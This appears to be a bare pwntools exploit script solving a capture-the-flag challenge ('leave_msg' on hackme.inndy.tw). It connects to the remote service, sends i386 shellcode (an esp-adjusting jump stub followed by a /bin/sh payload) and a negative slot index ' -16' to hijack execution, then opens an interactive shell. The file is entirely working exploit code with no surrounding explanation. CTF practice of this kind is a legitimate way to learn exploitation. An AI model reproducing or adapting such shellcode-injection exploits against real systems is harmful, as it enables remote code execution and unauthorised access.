from pwn import *
context.log_level = 'debug'
context(arch = 'i386')
#p = process('leave_msg',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7715)

p.recvuntil('message:\n')
#gdb.attach(p,"b *" + str(0x08048686))

shellcode = asm("add esp, 0x36;jmp esp")
shellcode += '\x00' + asm(shellcraft.sh())
p.send(shellcode)
p.recvuntil('slot?\n')
p.send(' -16')

p.interactive()